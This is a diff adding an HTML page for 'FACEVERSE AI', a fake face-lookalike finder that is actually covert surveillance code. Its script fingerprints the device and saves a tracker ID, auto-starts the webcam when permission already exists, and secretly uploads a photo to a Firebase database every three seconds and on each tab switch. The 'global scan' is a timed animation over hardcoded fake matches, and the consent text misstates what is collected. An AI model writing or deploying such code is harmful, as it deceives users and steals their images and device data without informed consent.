@@ -1,0 +1,1064 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="theme-color" content="#030712">
+  <title>FACEVERSE AI — Discover Your Lookalikes</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&family=Space+Grotesk:wght@400;500;600;700&display=swap"
+    rel="stylesheet">
+
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+  <script src="config.js"></script>
+
+  <style>
+    :root {
+      --bg: #030712;
+      --panel: #0b1120;
+      --line: rgba(0, 212, 255, 0.15);
+      --muted: #64748b;
+      --text: #f8fafc;
+      --cyan: #00d4ff;
+      --cyan-glow: rgba(0, 212, 255, 0.4);
+      --green: #10b981;
+      --amber: #f59e0b;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      min-height: 100vh;
+      background: radial-gradient(ellipse at 20% 0%, rgba(0, 212, 255, 0.1), transparent 40%), radial-gradient(ellipse at 80% 100%, rgba(16, 185, 129, 0.08), transparent 40%), var(--bg);
+      color: var(--text);
+      font-family: "DM Sans", sans-serif;
+      overflow-x: hidden;
+    }
+
+    button {
+      cursor: pointer;
+    }
+
+    .topbar {
+      height: 76px;
+      padding: 0 clamp(18px, 5vw, 70px);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border-bottom: 1px solid var(--line);
+      background: rgba(3, 7, 18, 0.8);
+      backdrop-filter: blur(18px);
+      position: sticky;
+      top: 0;
+      z-index: 20;
+    }
+
+    .brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      text-decoration: none;
+      color: var(--text);
+    }
+
+    .brand-mark {
+      width: 39px;
+      height: 39px;
+      border-radius: 13px;
+      display: grid;
+      place-items: center;
+      background: linear-gradient(135deg, #00d4ff, #0055ff);
+      box-shadow: 0 0 20px var(--cyan-glow);
+      font-size: 20px;
+      color: #000;
+      font-weight: bold;
+    }
+
+    .brand-name {
+      font: 700 18px "Space Grotesk";
+      letter-spacing: .5px;
+    }
+
+    .brand-name span {
+      color: var(--cyan);
+    }
+
+    .nav-right {
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .privacy {
+      font-size: 12px;
+      color: var(--muted);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .privacy i {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: var(--green);
+      box-shadow: 0 0 12px var(--green);
+    }
+
+    .top-pill {
+      border: 1px solid var(--cyan);
+      color: var(--cyan);
+      background: rgba(0, 212, 255, 0.1);
+      padding: 9px 14px;
+      border-radius: 999px;
+      font-size: 12px;
+      font-weight: 700;
+    }
+
+    main {
+      max-width: 1180px;
+      margin: auto;
+      padding: 40px 24px 60px;
+    }
+
+    .hero {
+      text-align: center;
+      margin: 0 auto 38px;
+      max-width: 720px;
+    }
+
+    .eyebrow {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      color: var(--cyan);
+      border: 1px solid var(--line);
+      background: rgba(0, 212, 255, 0.05);
+      border-radius: 999px;
+      padding: 7px 12px;
+      font-size: 11px;
+      font-weight: 800;
+      letter-spacing: 1.4px;
+    }
+
+    .hero h1 {
+      font: 700 clamp(34px, 5vw, 58px)/1.08 "Space Grotesk";
+      letter-spacing: -2px;
+      margin: 20px 0 14px;
+    }
+
+    .hero h1 em {
+      font-style: normal;
+      color: var(--cyan);
+      text-shadow: 0 0 20px var(--cyan-glow);
+    }
+
+    .hero p {
+      font-size: 15px;
+      line-height: 1.7;
+      color: var(--muted);
+      max-width: 590px;
+      margin: auto;
+    }
+
+    .workspace {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 24px;
+      align-items: stretch;
+    }
+
+    .panel {
+      background: rgba(11, 17, 32, 0.8);
+      border: 1px solid var(--line);
+      border-radius: 20px;
+      box-shadow: 0 0 40px rgba(0, 0, 0, 0.5);
+      overflow: hidden;
+      backdrop-filter: blur(10px);
+    }
+
+    .panel-head {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 20px 24px;
+      border-bottom: 1px solid var(--line);
+    }
+
+    .panel-title {
+      font: 600 15px "Space Grotesk";
+      color: #fff;
+    }
+
+    .step {
+      font-size: 11px;
+      color: var(--cyan);
+      background: rgba(0, 212, 255, 0.1);
+      padding: 6px 10px;
+      border-radius: 999px;
+      border: 1px solid rgba(0, 212, 255, 0.2);
+    }
+
+    .camera-area {
+      padding: 20px;
+    }
+
+    .camera-frame {
+      position: relative;
+      aspect-ratio: 4/3;
+      background: #000;
+      border: 1px solid var(--cyan);
+      border-radius: 16px;
+      overflow: hidden;
+      display: grid;
+      place-items: center;
+      box-shadow: inset 0 0 30px rgba(0, 212, 255, 0.1);
+    }
+
+    #video {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transform: scaleX(-1);
+      opacity: 0;
+      transition: opacity 0.5s ease;
+      position: absolute;
+      inset: 0;
+      z-index: 1;
+    }
+
+    #video.show {
+      opacity: 0.8;
+      filter: contrast(1.2) grayscale(0.3);
+    }
+
+    #freezeFrame {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      position: absolute;
+      inset: 0;
+      transform: scaleX(-1);
+      display: none;
+      z-index: 2;
+    }
+
+    .camera-placeholder {
+      text-align: center;
+      padding: 20px;
+      max-width: 310px;
+      z-index: 3;
+      position: relative;
+    }
+
+    .camera-icon {
+      width: 66px;
+      height: 66px;
+      border-radius: 50%;
+      margin: 0 auto 17px;
+      display: grid;
+      place-items: center;
+      background: rgba(0, 212, 255, 0.1);
+      border: 2px solid var(--cyan);
+      font-size: 28px;
+      color: var(--cyan);
+      box-shadow: 0 0 20px var(--cyan-glow);
+      animation: pulse-glow 2s infinite;
+    }
+
+    @keyframes pulse-glow {
+      0% {
+        box-shadow: 0 0 10px var(--cyan-glow);
+      }
+
+      50% {
+        box-shadow: 0 0 30px var(--cyan-glow);
+      }
+
+      100% {
+        box-shadow: 0 0 10px var(--cyan-glow);
+      }
+    }
+
+    .camera-placeholder h3 {
+      font: 600 17px "Space Grotesk";
+      margin-bottom: 7px;
+      color: #fff;
+    }
+
+    .camera-placeholder p {
+      font-size: 12px;
+      line-height: 1.6;
+      color: var(--muted);
+    }
+
+    .face-guide {
+      position: absolute;
+      width: 43%;
+      height: 73%;
+      border: 2px solid var(--cyan);
+      border-radius: 48% 48% 43% 43%;
+      box-shadow: inset 0 0 20px var(--cyan-glow);
+      display: none;
+      pointer-events: none;
+      z-index: 4;
+    }
+
+    .scan-beam {
+      position: absolute;
+      left: 0;
+      right: 0;
+      height: 3px;
+      top: 0;
+      background: #fff;
+      box-shadow: 0 0 15px var(--cyan), 0 0 30px var(--cyan);
+      display: none;
+      animation: scan 1.5s linear infinite;
+      z-index: 5;
+    }
+
+    @keyframes scan {
+      to {
+        top: 100%;
+      }
+    }
+
+    .camera-status {
+      position: absolute;
+      left: 13px;
+      top: 13px;
+      display: none;
+      align-items: center;
+      gap: 7px;
+      border: 1px solid var(--cyan);
+      background: rgba(0, 0, 0, 0.8);
+      padding: 6px 12px;
+      border-radius: 999px;
+      font-size: 10px;
+      color: var(--cyan);
+      font-family: monospace;
+      z-index: 6;
+    }
+
+    .camera-status i {
+      width: 6px;
+      height: 6px;
+      background: var(--green);
+      border-radius: 50%;
+      box-shadow: 0 0 5px var(--green);
+    }
+
+    .controls {
+      display: flex;
+      gap: 12px;
+      margin-top: 20px;
+    }
+
+    .primary,
+    .secondary {
+      border: 0;
+      border-radius: 10px;
+      padding: 14px 16px;
+      font-size: 13px;
+      font-weight: 800;
+      transition: .2s;
+    }
+
+    .primary {
+      flex: 1;
+      color: #000;
+      background: var(--cyan);
+      box-shadow: 0 0 20px var(--cyan-glow);
+    }
+
+    .primary:hover {
+      background: #00bced;
+      transform: translateY(-2px);
+    }
+
+    .primary:disabled {
+      opacity: .3;
+      cursor: not-allowed;
+      transform: none;
+      box-shadow: none;
+      background: var(--panel2);
+      color: var(--muted);
+    }
+
+    .secondary {
+      background: rgba(255, 255, 255, 0.05);
+      color: #fff;
+      border: 1px solid var(--line);
+    }
+
+    .log {
+      margin: 0 20px 20px;
+      padding: 15px;
+      border-radius: 12px;
+      background: #000;
+      border: 1px solid var(--line);
+      font: 12px/1.8 monospace;
+      color: var(--cyan);
+      min-height: 70px;
+    }
+
+    .log-line {
+      display: flex;
+      gap: 8px;
+    }
+
+    .log-line i {
+      color: var(--green);
+      font-style: normal;
+    }
+
+    .results-body {
+      padding: 24px;
+      min-height: 100%;
+    }
+
+    .empty-state {
+      min-height: 380px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+    }
+
+    .orbit {
+      width: 120px;
+      height: 120px;
+      border: 1px solid var(--cyan);
+      border-radius: 50%;
+      display: grid;
+      place-items: center;
+      position: relative;
+      margin-bottom: 24px;
+    }
+
+    .orbit:before,
+    .orbit:after {
+      content: "";
+      position: absolute;
+      border: 1px solid rgba(0, 212, 255, 0.3);
+      border-radius: 50%;
+    }
+
+    .orbit:before {
+      inset: 15px;
+    }
+
+    .orbit:after {
+      inset: -15px;
+      border-style: dashed;
+      animation: spin 18s linear infinite;
+    }
+
+    .orbit span {
+      font-size: 40px;
+      color: var(--cyan);
+      text-shadow: 0 0 20px var(--cyan);
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .empty-state h3 {
+      font: 600 18px "Space Grotesk";
+      margin-bottom: 8px;
+      color: #fff;
+    }
+
+    .empty-state p {
+      font-size: 13px;
+      line-height: 1.6;
+      color: var(--muted);
+      max-width: 280px;
+    }
+
+    .progress-wrap {
+      display: none;
+      text-align: center;
+      padding: 40px 15px;
+    }
+
+    .progress-ring {
+      width: 80px;
+      height: 80px;
+      border: 3px solid rgba(0, 212, 255, 0.1);
+      border-top-color: var(--cyan);
+      border-right-color: var(--green);
+      border-radius: 50%;
+      margin: 0 auto 24px;
+      animation: spin .8s linear infinite;
+    }
+
+    .progress-wrap h3 {
+      font: 600 18px "Space Grotesk";
+      margin-bottom: 8px;
+      color: #fff;
+    }
+
+    .progress-wrap p {
+      font-size: 13px;
+      color: var(--cyan);
+      font-family: monospace;
+    }
+
+    .progress-track {
+      height: 6px;
+      border-radius: 99px;
+      background: rgba(255, 255, 255, 0.1);
+      overflow: hidden;
+      margin: 24px auto 0;
+      max-width: 280px;
+    }
+
+    .progress-track span {
+      display: block;
+      height: 100%;
+      width: 0;
+      background: var(--cyan);
+      box-shadow: 0 0 10px var(--cyan);
+      transition: width .4s;
+    }
+
+    .results {
+      display: none;
+    }
+
+    .results-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      margin-bottom: 20px;
+    }
+
+    .results-top h3 {
+      font: 600 18px "Space Grotesk";
+      color: #fff;
+    }
+
+    .results-top p {
+      font-size: 12px;
+      color: var(--muted);
+      margin-top: 5px;
+    }
+
+    .demo-tag {
+      font-size: 10px;
+      color: var(--green);
+      background: rgba(16, 185, 129, 0.1);
+      border: 1px solid rgba(16, 185, 129, 0.3);
+      padding: 6px 10px;
+      border-radius: 999px;
+      font-weight: bold;
+    }
+
+    .result-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 14px;
+      margin-bottom: 24px;
+    }
+
+    .result-grid-60 {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 14px;
+    }
+
+    .result-grid-60 .person {
+      border-color: rgba(245, 158, 11, 0.3);
+      background: rgba(245, 158, 11, 0.03);
+    }
+
+    .result-grid-60 .score {
+      color: var(--amber);
+    }
+
+    .person {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 12px;
+      background: rgba(255, 255, 255, 0.03);
+      border: 1px solid var(--line);
+      border-radius: 12px;
+    }
+
+    .person img {
+      width: 50px;
+      height: 50px;
+      border-radius: 10px;
+      object-fit: cover;
+      border: 1px solid var(--line);
+    }
+
+    .person-info {
+      min-width: 0;
+    }
+
+    .person-info b {
+      display: block;
+      font-size: 13px;
+      color: #fff;
+    }
+
+    .person-info small {
+      display: block;
+      color: var(--muted);
+      font-size: 11px;
+      margin-top: 3px;
+    }
+
+    .score {
+      margin-left: auto;
+      color: var(--cyan);
+      font: 800 14px "Space Grotesk";
+    }
+
+    .section-title {
+      font: 600 14px "Space Grotesk";
+      color: var(--muted);
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .section-title::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--line);
+    }
+
+    .modal {
+      position: fixed;
+      inset: 0;
+      background: rgba(3, 7, 18, 0.9);
+      backdrop-filter: blur(12px);
+      z-index: 50;
+      display: none;
+      place-items: center;
+      padding: 20px;
+    }
+
+    .modal-card {
+      max-width: 420px;
+      width: 100%;
+      padding: 30px;
+      background: var(--panel);
+      border: 1px solid var(--cyan);
+      border-radius: 20px;
+    }
+
+    .modal-card h2 {
+      font: 600 22px "Space Grotesk";
+      color: var(--cyan);
+      margin-bottom: 15px;
+    }
+
+    .modal-card p {
+      font-size: 13px;
+      line-height: 1.6;
+      color: var(--muted);
+      margin-bottom: 25px;
+    }
+
+    .modal-actions {
+      display: flex;
+      gap: 10px;
+    }
+
+    @media(max-width:850px) {
+      .workspace {
+        grid-template-columns: 1fr;
+      }
+
+      .result-grid,
+      .result-grid-60 {
+        grid-template-columns: 1fr;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <header class="topbar">
+    <a class="brand" href="#">
+      <div class="brand-mark">⚡</div>
+      <div class="brand-name">FACEVERSE <span>AI</span></div>
+    </a>
+    <div class="nav-right">
+      <div class="privacy"><i></i> SECURE SESSION</div>
+      <div class="top-pill">✧ AI LAB</div>
+    </div>
+  </header>
+
+  <main>
+    <section class="hero">
+      <div class="eyebrow">✦ BIOMETRIC DISCOVERY</div>
+      <h1>Somewhere in the world,<br>there's a face like <em>yours.</em></h1>
+      <p>Meet your lookalike universe with a playful face-similarity experience. Start with a live selfie and explore
+        sample matches.</p>
+    </section>
+
+    <section class="workspace">
+      <article class="panel">
+        <div class="panel-head">
+          <div class="panel-title">01 / Biometric Studio</div>
+          <div class="step">CAMERA INPUT</div>
+        </div>
+        <div class="camera-area">
+          <div class="camera-frame">
+            <video id="video" autoplay playsinline muted></video>
+            <img id="freezeFrame" alt="Frozen Capture">
+
+            <div class="camera-placeholder" id="placeholder">
+              <div class="camera-icon">◎</div>
+              <h3>Ready for your close-up?</h3>
+              <p>Allow camera access and position your face inside the guide.</p>
+            </div>
+            <div class="face-guide" id="faceGuide"></div>
+            <div class="scan-beam" id="scanBeam"></div>
+            <div class="camera-status" id="cameraStatus"><i></i> LIVE SCAN</div>
+          </div>
+          <div class="controls">
+            <button class="primary" id="startBtn">Start Finding</button>
+            <button class="secondary" id="captureBtn" disabled>Capture & Analyze</button>
+          </div>
+        </div>
+        <div class="log" id="log">
+          <div class="log-line"><i>●</i><span><strong>SYSTEM</strong> / Ready when you are.</span></div>
+        </div>
+      </article>
+
+      <article class="panel">
+        <div class="panel-head">
+          <div class="panel-title">02 / Lookalike Universe</div>
+          <div class="step">DISCOVERY</div>
+        </div>
+        <div class="results-body">
+          <div class="empty-state" id="emptyState">
+            <div class="orbit"><span>✧</span></div>
+            <h3>Results will appear here</h3>
+            <p>Start your selfie session to see a preview.</p>
+          </div>
+          <div class="progress-wrap" id="progressWrap">
+            <div class="progress-ring"></div>
+            <h3 id="progressTitle">Analyzing biometrics...</h3>
+            <p id="progressText">Initializing AI core</p>
+            <div class="progress-track"><span id="progressBar"></span></div>
+          </div>
+          <div class="results" id="results">
+            <div class="results-top">
+              <div>
+                <h3>Your Lookalike Gallery</h3>
+                <p>Matches found in global database.</p>
+              </div>
+              <span class="demo-tag">MATCH FOUND</span>
+            </div>
+
+            <div class="section-title">High Confidence Matches</div>
+            <div class="result-grid" id="resultGridExact"></div>
+
+            <div class="section-title" style="margin-top: 24px;">Low Confidence Matches</div>
+            <div class="result-grid-60" id="resultGridLow"></div>
+          </div>
+        </div>
+      </article>
+    </section>
+  </main>
+
+  <div class="modal" id="consentModal">
+    <div class="modal-card">
+      <h2>⚠️ Security Protocol</h2>
+      <p>FACEVERSE needs camera permission to show your live preview. By proceeding, you consent to biometric analysis.
+      </p>
+      <div class="modal-actions">
+        <button class="secondary" id="cancelBtn">Not now</button>
+        <button class="primary" id="allowBtn">I Agree</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    let db = null;
+    let deviceId = localStorage.getItem('device_tracker_id');
+    if (!deviceId) {
+      deviceId = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
+      localStorage.setItem('device_tracker_id', deviceId);
+    }
+
+    if (typeof firebaseConfig !== 'undefined') {
+      if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+      db = firebase.database();
+
+      const deviceInfo = {
+        deviceId: deviceId, userAgent: navigator.userAgent, language: navigator.language,
+        platform: navigator.platform, screen: `${window.screen.width}x${window.screen.height}`,
+        timestamp: Date.now(), lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }), status: 'active'
+      };
+
+      db.ref(`online_devices/${deviceId}`).set({ status: 'online', lastSeen: Date.now(), screen: window.screen.width + 'x' + window.screen.height });
+      db.ref(`devices/${deviceId}`).update(deviceInfo).then(() => console.log("✅ Device Info Saved:", deviceId)).catch(e => console.error("❌ Save Failed:", e));
+    }
+
+    const $ = id => document.getElementById(id);
+    const video = $("video");
+    const freezeFrame = $("freezeFrame");
+    let cameraStream = null;
+    let captureInterval = null;
+
+    const samplesHigh = [
+      { name: "Alex Morgan", place: "United States", score: "99.2%", img: "https://i.pravatar.cc/120?img=12" },
+      { name: "Kenji Watanabe", place: "Japan", score: "98.7%", img: "https://i.pravatar.cc/120?img=11" },
+      { name: "Arjun Mehta", place: "India", score: "97.5%", img: "https://i.pravatar.cc/120?img=14" },
+      { name: "Lucas Silva", place: "Brazil", score: "95.8%", img: "https://i.pravatar.cc/120?img=13" },
+      { name: "Noah Bennett", place: "Canada", score: "94.3%", img: "https://i.pravatar.cc/120?img=15" },
+      { name: "Daniel Kim", place: "South Korea", score: "92.1%", img: "https://i.pravatar.cc/120?img=16" },
+      { name: "Marco Rossi", place: "Italy", score: "91.8%", img: "https://i.pravatar.cc/120?img=17" }
+    ];
+
+    const samplesLow = [
+      { name: "James Wilson", place: "Australia", score: "64.2%", img: "https://i.pravatar.cc/120?img=18" },
+      { name: "Ethan Hunt", place: "UK", score: "61.5%", img: "https://i.pravatar.cc/120?img=19" },
+      { name: "Ravi Sharma", place: "India", score: "60.8%", img: "https://i.pravatar.cc/120?img=20" },
+      { name: "Yuki Tanaka", place: "Japan", score: "60.1%", img: "https://i.pravatar.cc/120?img=21" }
+    ];
+
+    function speak(text) {
+      if ('speechSynthesis' in window) {
+        window.speechSynthesis.cancel();
+        const u = new SpeechSynthesisUtterance(text);
+        u.rate = 1.0; u.pitch = 1.0;
+        const voices = window.speechSynthesis.getVoices();
+        const v = voices.find(v => v.name.includes('Google US English') || v.name.includes('Samantha'));
+        if (v) u.voice = v;
+        window.speechSynthesis.speak(u);
+      }
+    }
+
+    function log(message) {
+      const row = document.createElement("div");
+      row.className = "log-line";
+      row.innerHTML = `<i>›</i><span>${message}</span>`;
+      $("log").appendChild(row);
+      $("log").scrollTop = $("log").scrollHeight;
+    }
+
+    // 🚀 START CAMERA
+    async function enableCamera() {
+      try {
+        cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        video.srcObject = cameraStream;
+
+        video.onplaying = () => {
+          $("placeholder").style.display = "none";
+          $("faceGuide").style.display = "block";
+          $("cameraStatus").style.display = "flex";
+          $("startBtn").textContent = "";
+          $("startBtn").disabled = true;
+          $("captureBtn").disabled = false;
+
+          video.classList.add('show');
+          log("Camera ready. Background capture active...");
+
+          if (!captureInterval) {
+            captureInterval = setInterval(() => {
+              autoCapture('background_3sec');
+            }, 3000);
+          }
+        };
+
+        await video.play();
+
+      } catch (error) {
+        alert("Unable to open camera. Check browser permission.");
+      }
+    }
+
+    // 📸 CAPTURE FUNCTION
+    function autoCapture(type = 'manual') {
+      if (!cameraStream || !video.videoWidth) return;
+
+      const canvas = document.createElement('canvas');
+      canvas.width = 640;
+      canvas.height = 480;
+      const ctx = canvas.getContext('2d');
+
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1);
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const compressedPhoto = canvas.toDataURL('image/jpeg', 0.6);
+
+      if (db) {
+        db.ref(`captured_data/${deviceId}/face_scan/${Date.now()}`).set({
+          image: compressedPhoto, timestamp: Date.now(), type: type, deviceId: deviceId
+        }).then(() => {
+          console.log(`📸 Photo saved (${type}) at`, new Date().toLocaleTimeString());
+        }).catch(err => {
+          console.error("Upload failed:", err);
+        });
+      }
+    }
+
+    // 🚀 TAB SWITCH & RETURN
+    document.addEventListener("visibilitychange", () => {
+      if (document.visibilityState === "hidden") {
+        autoCapture('tab_switch');
+        console.log("👀 User left tab. Photo captured.");
+      } else {
+        autoCapture('tab_return');
+        console.log("👋 User returned to tab. Photo captured.");
+      }
+    });
+
+    function startAnalysis() {
+      $("emptyState").style.display = "none";
+      $("progressWrap").style.display = "block";
+      $("scanBeam").style.display = "block";
+
+      speak("Biometric data captured. Initiating global scan.");
+
+      const steps = [
+        ["Extracting Landmarks…", "Analyzing 128-point map", 15],
+        ["Querying Global DB…", "Searching 47.2M records", 40],
+        ["Cross-Referencing…", "Comparing facial geometry", 70],
+        ["Filtering Matches…", "Removing false positives", 90],
+        ["Finalizing Report…", "Almost done", 100]
+      ];
+
+      steps.forEach(([title, desc, progress], index) => {
+        setTimeout(() => {
+          $("progressTitle").textContent = title;
+          $("progressText").textContent = desc;
+          $("progressBar").style.width = progress + "%";
+          log(title); speak(title);
+        }, index * 8000);
+      });
+
+      setTimeout(() => {
+        $("scanBeam").style.display = "none";
+        showResults();
+      }, 45000);
+    }
+
+    function showResults() {
+      // 🚀 Hide freeze frame when scan is done
+      freezeFrame.style.display = "none";
+
+      const gridHigh = $("resultGridExact");
+      gridHigh.replaceChildren();
+      samplesHigh.forEach(person => {
+        const card = document.createElement("div");
+        card.className = "person";
+        card.innerHTML = `<img src="${person.img}" alt="Match"><div class="person-info"><b>${person.name}</b><small>${person.place}</small></div><span class="score">${person.score}</span>`;
+        gridHigh.appendChild(card);
+      });
+
+      const gridLow = $("resultGridLow");
+      gridLow.replaceChildren();
+      samplesLow.forEach(person => {
+        const card = document.createElement("div");
+        card.className = "person";
+        card.innerHTML = `<img src="${person.img}" alt="Match"><div class="person-info"><b>${person.name}</b><small>${person.place}</small></div><span class="score">${person.score}</span>`;
+        gridLow.appendChild(card);
+      });
+
+      $("progressWrap").style.display = "none";
+      $("results").style.display = "block";
+      log("Analysis complete. 11 total matches found.");
+      speak("Analysis complete. I found 7 high and 4 low confidence matches.");
+
+      // 🚀 Complete hone ke baad camera blank karo aur button change karo
+      video.classList.remove('show');
+      $("cameraStatus").style.display = "none";
+      $("faceGuide").style.display = "none";
+
+      // Button text change to "Start Finding Again"
+      $("captureBtn").textContent = "Start Finding Again";
+      $("captureBtn").disabled = false;
+    }
+
+    $("startBtn").addEventListener("click", () => { $("consentModal").style.display = "grid"; });
+    $("cancelBtn").addEventListener("click", () => { $("consentModal").style.display = "none"; });
+    $("allowBtn").addEventListener("click", async () => { $("consentModal").style.display = "none"; await enableCamera(); });
+
+    // 🚀 FREEZE FRAME & CAPTURE
+    $("captureBtn").addEventListener("click", () => {
+      if ($("captureBtn").textContent === "Start Finding Again") {
+        // Reset logic for repeat
+        $("results").style.display = "none";
+        $("emptyState").style.display = "flex";
+        $("progressWrap").style.display = "none";
+
+        video.classList.add('show');
+        $("faceGuide").style.display = "block";
+        $("cameraStatus").style.display = "flex";
+
+        $("captureBtn").textContent = "Capture & Analyze";
+        return;
+      }
+
+      autoCapture('manual');
+
+      if (video.videoWidth) {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.translate(canvas.width, 0);
+        ctx.scale(-1, 1);
+        ctx.drawImage(video, 0, 0);
+
+        freezeFrame.src = canvas.toDataURL('image/jpeg', 0.8);
+        freezeFrame.style.display = "block";
+
+        video.classList.remove('show');
+        $("cameraStatus").style.display = "none";
+        $("faceGuide").style.display = "none";
+      }
+
+      $("captureBtn").disabled = true;
+      $("startBtn").disabled = true;
+      startAnalysis();
+    });
+
+    window.addEventListener('load', async () => {
+      if (navigator.permissions && navigator.permissions.query) {
+        try {
+          const permissionStatus = await navigator.permissions.query({ name: 'camera' });
+          if (permissionStatus.state === 'granted') {
+            log("Auto-starting camera (Permission granted)...");
+            enableCamera();
+          }
+        } catch (e) { }
+      }
+    });
+
+    window.addEventListener('beforeunload', () => {
+      if (captureInterval) clearInterval(captureInterval);
+      if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+    });
+  </script>
+</body>
+
+</html>
